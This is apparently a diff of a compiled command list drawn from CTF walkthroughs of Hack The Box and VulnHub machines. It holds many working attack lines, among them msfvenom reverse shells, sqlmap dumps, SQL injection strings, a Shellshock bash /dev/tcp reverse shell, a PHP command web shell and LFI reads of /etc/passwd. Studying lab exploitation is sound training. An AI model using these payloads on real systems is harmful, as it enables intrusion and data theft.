 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-enterprises-walkthrough/
+
 nmap -sV 10.10.10.61
 dirb http://10.10.10.61
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 –f raw
@@ -7706,7 +8550,10 @@ gdb /bin/lcars
 
 
 
+
+Challenge Name: Hack The Box Challenge Falafel Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-falafel-walkthrough/
+
 nmap –A 10.10.10.73
 sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
 sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel --tables --batch
@@ -7744,7 +8591,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Charon Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-charon-walkthrough/
+
 nmap -sV 10.10.10.31
 ' UNion select 1,2,3,concat(database(), "@who.ami") -- -
 ' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 1,1 -- -
@@ -7769,7 +8619,10 @@ supershell "/bin/ls$
 
 
 
+
+Challenge Name: Hack The Pinkypalace Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-pinkypalace-vm-ctf-challenge/
+
 nmap -sV -p- 192.168.1.137
 dirb http://127.0.0.1:8080 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -p 192.168.1.137:31337
 sqlmap --proxy=http://192.168.1.137:31337 –data="user=hacking&pass=articles&submit=Login" -u http://127.0.0.1:8080/littlesecrets-main/login.php --level=5 --risk=3 --dump users
@@ -7781,7 +8634,10 @@ ssh -i id_rsa pinky@localhost -p64666
 
 
 
+
+Challenge Name: Hack The Box Challenge Jail Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-jail-walkthrough/
+
 nmap -sV –p- 10.10.10.34 --open
 gdb -q jail
 (gdb)  set follow-fork-mode child
@@ -7801,7 +8657,10 @@ ssh -i id_rsa 10.10.10.34
 
 
 
+
+Challenge Name: Hack The Box Challenge Nibble Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-nibble-walkthrough/
+
 nmap -A 10.10.10.75
 use exploit/multi/http/nibbleblog_file_upload
 msf exploit(multi/http/nibbleblog_file_upload) > set rhost 10.10.10.75
@@ -7832,7 +8691,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Blackmarket Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-blackmarket-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.104
 cewl http://bourne.wikia.com/wiki/Operation_Treadstone -d 2 -w /root/Desktop/dict.txt
@@ -7872,7 +8734,10 @@ cat THEEND.txt
 
 
 
+
+Challenge Name: Hack The Box October Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-october-walkthrough/
+
 nmap -sV 10.10.10.16
 msfvenom -p php/meterpreter/reverse_tcp  lhost=10.10.14.25 lport=4444 -f raw > shell.php5
 msf > use exploit/multi/handler
@@ -7896,7 +8761,10 @@ gdb /usr/local/bin/ovrflw -q
 
 
 
+
+Challenge Name: Hack The Box Nineveh Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-nineveh-walkthrough/
+
 nmap -A 10.10.10.43
 dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt
 Username: admin
@@ -7922,7 +8790,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Gemini Inc Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-gemini-inc-ctf-challenge/
+
 nmap -p- -A 192.168.1.103 --open
 php -S 0.0.0.0:4444
 <iframe height="1000" width="800" src="http://192.168.1.108:4444/?file=/etc/passwd"></iframe>
@@ -7941,7 +8812,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Sneaky Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/
+
 nmap -sT -sU 10.10.10.20
 dirb http://10.10.10.20/
 msf > use auxiliary/scanner/snmp/snmp_enum
@@ -7956,7 +8830,10 @@ pattern_offset.rb -q 316d4130 -l 500
 
 
 
+
+Challenge Name: Hack The Box Challenge Chatterbox Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-chatterbox-walkthrough/
+
 nmap -p1-10000 10.10.10.74
 cd Desktop
 cp /usr/share/exploitdb/exploits/windows/remote/36025.py .
@@ -7973,7 +8850,10 @@ type root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Crimestoppers Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-crimestoppers-walkthrough/
+
 nmap -A 10.10.10.80
 curl http://10.10.10.80/?op=upload =php://filter/convert.base64-encode/resource=upload
 zip -0 shell.zip shell.php
@@ -8007,7 +8887,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Jeeves Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-jeeves-walkthrough/
+
 nmap -A 10.10.10.63
 use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) > set target 2
@@ -8046,7 +8929,10 @@ more < hm.txt:root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Fluxcapacitor Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-fluxcapacitor-walkthrough/
+
 nmap -sV 10.10.10.69
 wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
 curl "http://10.10.10.69/sync?opt=' whoami'"
@@ -8062,7 +8948,10 @@ curl "http://10.10.10.69/sync?opt=' sudo /h'ome/themiddle/.monit' cmd Y2F0IC9yb2
 
 
 
+
+Challenge Name: Hack The Box Challenge Tally Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-tally-walkthrough/
+
 nmap -A 10.10.10.59
 Username: ftp_user
 Password: UTDRSCH53c"$6hys
@@ -8110,7 +8999,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Inception Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-inception-walkthrough/
+
 nmap -A 10.10.10.67
 curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
 http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf
@@ -8145,7 +9037,10 @@ ssh root@192.168.0.1
 
 
 
+
+Challenge Name: Hack The Box Challenge Bashed Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-bashed-walkthrough/
+
 nmap -A 10.10.10.68
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.28 lport=4444 -f raw
 msf use exploit/multi/handler
@@ -8181,7 +9076,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Kotarak Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-kotarak-walkthrough/
+
 nmap -p- -A 10.10.10.55 --open
 dirb http://10.10.10.55:60000/
 curl http://10.10.10.55:60000/url.php?path=localhost:888/?doc=backup
@@ -8194,7 +9092,10 @@ msf exploit(multi/http/tomcat_mgr_upload) > exploit
 
 
 
+
+Challenge Name: Hack The Box Challenge Lazy Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-lazy-walkthrough/
+
 nmap -A 10.10.10.18
 ssh -i key mitsos@10.10.10.18
 cd /tmp
@@ -8208,7 +9109,10 @@ ls
 
 
 
+
+Challenge Name: Hack The Box Challenge Brainfuck Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-brainfuck-walkthrough/
+
 nmap -A 10.10.10.17
 wpscan -u https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
 python -m SimpleHTTPServer 80
@@ -8221,7 +9125,10 @@ python decrypt.py
 
 
 
+
+Challenge Name: Hack The Box Challenge Europa Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-europa-walkthrough/
+
 nmap -A 10.10.10.22
 sqlmap -u https://admin-portal.europacorp.htb --form --dbs --batch
 sqlmap -u https://admin-portal.europacorp.htb -D admin --dump-all --batch
@@ -8244,7 +9151,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Calamity Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-calamity-walkthrough/
+
 nmap -A 10.10.10.27
 dirb http://10.10.10.27
 curl -v http://10.10.10.27/admin.php
@@ -8270,7 +9180,10 @@ lxc exec ignite /bin/sh
 
 
 
+
+Challenge Name: Hack The Box Challenge Shrek Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-shrek-walkthrough/
+
 nmap -sV 10.10.10.47
 dirb http://10.10.10.47
 wget http://10.10.10.47/uploads/secret_ultimate.php
@@ -8284,7 +9197,10 @@ gcc shell.c -o rootshell
 
 
 
+
+Challenge Name: Hack The Box Challenge Bank Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-bank-walkthrough/
+
 nmap -A 10.10.10.29
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw
 msf use exploit/multi/handler
@@ -8306,7 +9222,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Mantis Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-mantis-walkthrough/
+
 nmap -A 10.10.10.52
 git clone https://github.com/CoreSecurity/impacket.git
 python setup.py install
@@ -8318,7 +9237,10 @@ type root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Shocker Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-shocker-walkthrough/
+
 nmap -A 10.10.10.56
 dirb http://10.10.10.56
 dirb http://10.10.10.56/cgi-bin -X .sh
@@ -8341,7 +9263,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Devel Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-devel-walkthrough/
+
 nmap -A 10.10.10.5
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f aspx > shell.aspx
 http://10.10.10.5/shell.aspx
@@ -8364,7 +9289,10 @@ meterpreter > ls
 
 
 
+
+Challenge Name: Hack The Box Challenge Granny Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-granny-walkthrough/
+
 nmap -A 10.10.10.15
 use exploit/windows/iis/iis_webdav_upload_asp
 msf exploit(windows/iis/iis_webdav_upload_asp) >set rhost 10.10.10.15
@@ -8389,7 +9317,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Node Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-node-walkthrough/
+
 cat myplace.backup | base64 --decode > myplace
 fcrackzip -D -p /usr/share/wordlists/rockyou.txt data.zip
 msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport 8765 R
@@ -8399,7 +9330,10 @@ ln -s /root/root.txt /tmp/test
 
 
 
+
+Challenge Name: Hack The Box Challenge Haircut Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-haircut-walkthrough/
+
 nmap -A 10.10.10.24
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw
 python -m SimpleHTTPServer 80
@@ -8432,7 +9366,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Tenten Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-tenten-walkthrough/
+
 nmap -A 10.10.10.10
 wpscan –u http://10.10.10.10/ --enumerate t --enumerate t --enumerate u
 http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
@@ -8446,7 +9383,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Joker Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-joker-walkthrough/
+
 nmap -A 10.10.10.21
 tftp 10.10.10.21
 tftp > get passwords
@@ -8468,7 +9408,10 @@ ln -s root development
 
 
 
+
+Challenge Name: Hack The Box Challenge Popcorn Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-popcorn-walkthrough/
+
 nmap -A 10.10.10.6
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw
 msf use exploit/multi/handler
@@ -8479,7 +9422,10 @@ msf exploit(multi/handler) exploit
 
 
 
+
+Challenge Name: Hack The Box Challenge Cronos Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-cronos-walkthrough/
+
 nmap -A 10.10.10.13
 msf use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) set target 1
@@ -8499,7 +9445,10 @@ upload /root/Desktop/artisan.php /var/www/laravel/artisan
 
 
 
+
+Challenge Name: Hack The Box Challenge Beep Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-beep-walkthrough/
+
 nmap -sV 10.10.10.7
 use exploit/multi/http/vtiger_soap_upload
 msf exploit(multi/http/vtiger_soap_upload) set rhost 10.10.10.7
@@ -8516,7 +9465,10 @@ curl -k -H "user-agent: () { :; }; bash -i >& /dev/tcp/10.10.14.3/8081 0>&1" htt
 
 
 
+
+Challenge Name: Hack The Bob 1 0 1 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-bob-1-0-1-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.109
 http://192.168.1.109/dev_shell.php
@@ -8527,7 +9479,10 @@ gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
 
 
 
+
+Challenge Name: Hack The Box Challenge Legacy Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-legacy-walkthrough/
+
 nmap -A 10.10.10.4
 nmap --script vuln -p445 10.10.10.4
 use exploit/windows/smb/ms08_067_netapi
@@ -8540,7 +9495,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Sense Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-sense-walkthrough/
+
 nmap -A 10.10.10.60 --open
 use exploit/unix/http/pfsense_graph_injection_exec
 set rhost 10.10.10.60
@@ -8552,7 +9510,10 @@ exploit
 
 
 
+
+Challenge Name: Hack The Box Challenge Solid State Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-solid-state-walkthrough/
+
 nmap 10.10.10.51 -sV -p- --open
 nc 10.10.10.51 4555
 setpassword james 1234
@@ -8584,7 +9545,10 @@ nc -lvp 8081
 
 
 
+
+Challenge Name: Hack The Box Challenge Mirai Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-mirai-walkthrough/
+
 nmap -p- -A 10.10.10.48 --open
 dirb http://10.10.10.48
 Username:     pi
@@ -8599,7 +9563,10 @@ cat damnit.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Grandpa Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-grandpa-walkthrough/
+
 nmap -p- -sV 10.10.10.14
 use exploit/windows/iis/iis_webdav_scstoragepathfromurl
 msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set rhost 10.10.10.14
@@ -8621,7 +9588,10 @@ type root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Blue Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-blue-walkthrough/
+
 nmap -p- -A 10.10.10.40 --open
 nmap --script vuln -p445 10.10.10.40
 use exploit/windows/smb/ms17_010_eternalblue
@@ -8634,7 +9604,10 @@ type root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Lame Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-lame-walkthrough/
+
 nmap -sV 10.10.10.3
 use exploit/multi/samba/usermap_script
 msf exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
@@ -8651,7 +9624,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Blocky Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-blocky-walkthrough/
+
 nmap -sV 10.10.10.37
 dirb http://10.10.10.37
 http://10.10.10.37/plugins/files
@@ -8666,7 +9642,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The W1R3S Inc Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-w1r3s-inc-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.106 --open
 dirb http://192.168.1.106
@@ -8681,7 +9660,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Derpnstink Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-derpnstink-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.102 --open
 dirb http://192.168.1.102/
@@ -8695,7 +9677,10 @@ msf exploit(unix/webapp/wp_slideshowgallery_upload) > exploit
 
 
 
+
+Challenge Name: Hack Game Thrones Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-game-thrones-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -sV 192.168.1.133
 dirb http://192.168.1.133
@@ -8728,7 +9713,10 @@ exiftool  game_of_thrones.mp3
 
 
 
+
+Challenge Name: Hack Usv 2017 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-usv-2017-ctf-challenge/
+
 nmap -A -p- 192.168.0.18
 dirb http://192.168.0.18
 dirb http://192.168.0.18:15020
@@ -8741,7 +9729,10 @@ https://192.168.0.18:15020/blog/admin/edit.php?id=7 /*union*/union/*all*/all/*se
 
 
 
+
+Challenge Name: Hack Covfefe Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-covfefe-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.101
 dirb http://192.168.1.101:31337/
@@ -8766,7 +9757,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Born2Root Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-born2root-vm-ctf-challenge/
+
 netdiscover
 nmap -sV 192.168.1.137
 dirb http://192.168.1.137
@@ -8783,7 +9777,10 @@ su root
 
 
 
+
+Challenge Name: Hack Dina Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-dina-vm-ctf-challenge/
+
 netdiscover
 nmap –A 192.168.43.219
 dirb http://192.168.43.219
@@ -8810,7 +9807,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Rickdiculouslyeasy Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-rickdiculouslyeasy-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.101
 ftp 192.168.1.101
@@ -8862,7 +9862,10 @@ cat FLAG.txt
 
 
 
+
+Challenge Name: Hack Lazysysadmin Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-lazysysadmin-vm-ctf-challenge/
+
 netdiscover
 nmap  -p- -sV 192.168.1.16
 smbclient -L 192.168.1.16
@@ -8886,7 +9889,10 @@ su sudo
 
 
 
+
+Challenge Name: Hack Zico2 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-zico2-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.108
 dirb http://192.168.1.108/
@@ -8915,7 +9921,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Analougepond Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-analougepond-vm-ctf-challenge/
+
 nmap -sT -sU 192.168.0.108
 use auxiliary/scanner/snmp/snmp_enum
 msf auxiliary(snmp_enum) > set rhosts 192.168.0.108
@@ -8949,7 +9958,10 @@ scp me.jpeg eric@192.168.1.119:/home/eric/
 
 
 
+
+Challenge Name: Hack Moria 1 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-moria-1-1-ctf-challenge/
+
 netdiscover
 nmap -sV 192.168.1.125
 dirb http://192.168.1.125/
@@ -8967,7 +9979,10 @@ ssh -i id_rsa root@127.0.0.1
 
 
 
+
+Challenge Name: Hack Donkeydocker Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-donkeydocker-ctf-challenge/
+
 netdiscover
 nmap -sV 192.168.1.120
 dirb http://192.168.1.120
@@ -8999,7 +10014,10 @@ docker run -v /root:/hack -t debian:jessie /bin/sh -c 'cat /hack/flag.txt'
 
 
 
+
+Challenge Name: Hack D0Not5Top Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-d0not5top-vm-ctf-challenge/
+
 netdiscover
 nmap -sV 192.168.1.113
 dirb http://192.168.1.113
@@ -9022,7 +10040,10 @@ nc -lp 1234 -vv
 
 
 
+
+Challenge Name: Hack Super Mario Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-super-mario-ctf-challenge/
+
 nmap -p- -A 192.168.0.5
 dirb http://192.168.0.5:8180 /usr/share/wordlists/dirb/big.txt
 cd etc
@@ -9065,7 +10086,10 @@ unzip flag2.zip
 
 
 
+
+Challenge Name: Hack The Defense Space Vm Ctf Challengehack Defense Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-defense-space-vm-ctf-challengehack-defense-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.17
 ssh 192.168.1.17 -p 2225
@@ -9075,7 +10099,10 @@ dirb http://192.168.1.17
 
 
 
+
+Challenge Name: Hack Orcus Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-orcus-vm-ctf-challenge/
+
 nmap -p- -sV 192.168.0.151
 dirb http://192.168.0.151
 msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
@@ -9098,7 +10125,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Nightmare Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-nightmare-vm-ctf-challenge/
+
 nmap -p- -A 192.168.0.101
 dirb http://192.168.0.101:60080/?page=
 use exploit/multi/script/web_delivery
@@ -9119,7 +10149,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Fartknocker Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-fartknocker-vm-ctf-challenge/
+
 nmap -p- -A 192.168.1.25
 nmap -r -p 7000,8000,9000 192.168.1.25
 nmap -p- -A 192.168.1.25
@@ -9149,7 +10182,10 @@ SECRET = "LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK"
 
 
 
+
+Challenge Name: Hack Pluck Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-pluck-vm-ctf-challenge/
+
 nmap -p- -A 192.168.1.115
 nikto -h http://192.168.1.115
 http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
@@ -9178,7 +10214,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Sedna Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-sedna-vm-ctf-challenge/
+
 nmap -sV 192.168.1.110
 nikto -h http://192.168.1.110/
 use exploit/multi/http/builderengine_upload_exec
@@ -9191,7 +10230,10 @@ exploit
 
 
 
+
+Challenge Name: Hack Quaoar Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-quaoar-vm-ctf-challenge/
+
 nmap -p- -A 192.168.1.24
 wpscan --url http://192.168.1.24/wordpress/ --enumerate u
 nc –lpv 1234
@@ -9212,7 +10254,10 @@ cat php5
 
 
 
+
+Challenge Name: Hack Gibson Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-gibson-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.100
 use auxiliary/scanner/ssh/ssh_login
@@ -9241,7 +10286,10 @@ gpg --passphrase Z3r0K00l flag.txt.gpg
 
 
 
+
+Challenge Name: Hack Pipe Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-pipe-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.104 --open
 O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" <?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}
@@ -9260,7 +10308,10 @@ find raj -exec "/bin/sh" \;
 
 
 
+
+Challenge Name: Hack Usv Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-usv-vm-ctf-challenge/
+
 netdiscover
 ssh 192.168.0.103
 nikto -h 192.168.0.103 –useproxy  http://192.168.0.103:3129
@@ -9290,7 +10341,10 @@ cd /root
 
 
 
+
+Challenge Name: Hack Fortress Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-fortress-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.109
 Request: ls
@@ -9319,7 +10373,10 @@ cd /home/vulnhub
 
 
 
+
+Challenge Name: Hack Zorz Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-zorz-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.129
 dirb http://192.168.1.129 /usr/share/dirb/wordlists/big.txt
@@ -9328,7 +10385,10 @@ nc -lvp 1234
 
 
 
+
+Challenge Name: Hack Freshly Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-freshly-vm-ctf-challenge/
+
 nmap -p- -A 192.168.1.112
 sqlmap -u 'http://192.168.1.112/login.php' --forms --risk=3 --level=5 --dbs
 sqlmap -u 'http://192.168.1.112/login.php' --forms -D wordpress8080 --risk=3 --level=3 --dump-all
@@ -9346,7 +10406,10 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 
 
+
+Challenge Name: Hack Hackday Albania Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-hackday-albania-vm-ctf-challenge/
+
 nmap -A 192.168.1.127
 http://192.168.1.127:8008/unisxcudkqjydw/vulnbank/
 Username: ' or 'a' = 'a' --
@@ -9367,7 +10430,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Billy Madison Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-billy-madison-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.103
 smbclient -L 192.168.0.103
@@ -9409,7 +10475,10 @@ cat Billy_Madison12th_Grade_Fimal_Project.doc
 
 
 
+
+Challenge Name: Hack Acid Reloaded Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-acid-reloaded-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.106
 ssh 192.168.1.106
@@ -9443,7 +10512,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Lord Root Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-lord-root-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.101
 ssh 192.168.1.101 22
@@ -9470,7 +10542,10 @@ cat Flag.txt
 
 
 
+
+Challenge Name: Hack Acid Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-acid-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.103
 msf use exploit/multi/script/web_delivery
@@ -9500,7 +10575,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Spydersec Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-spydersec-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.101
 exiftool Challenge.png
@@ -9509,7 +10587,10 @@ python tcsteg.py mulder.fbi
 
 
 
+
+Challenge Name: Hack The Vulnos 2 0 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-vulnos-2-0-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.102
 searchsploit OpenDocMan 1.2.7
@@ -9529,7 +10610,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Fristileaks Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-fristileaks-vm-ctf-challenge/
+
 nmap -A 19.168.1.110
 base64 -d encode > 1.png
 192.168.1.110/fristi/uploads/shell/php.jpg
@@ -9557,7 +10641,10 @@ cat fristileafs_secrets.txt
 
 
 
+
+Challenge Name: Hack Nullbyte Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-nullbyte-vm-ctf-challenge/
+
 nmap -A 192.168.1.142
 exiftool main.gif
 sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs --batch
@@ -9596,7 +10683,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Hack Minotaur Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-minotaur-vm-ctf-challenge/
+
 nmap -A 192.168.56.223
 dirbuster
 wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p
@@ -9625,7 +10715,10 @@ cat /root/flag.txt
 
 
 
+
+Challenge Name: Hack Tommyboy Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/
+
 nmap -A 192.168.1.108
 nikto -h http://192.168.1.108/
 curl http://192.168.1.108/robots.txt
@@ -9668,7 +10761,10 @@ cat THE-END.txt
 
 
 
+
+Challenge Name: Hack Skydog Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-skydog-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.102
 exittool SkyDogCon_CTF.jpg
@@ -9695,7 +10791,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Milnet Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-milnet-vm-ctf-challenge/
+
 nikto -h 192.168.1.100
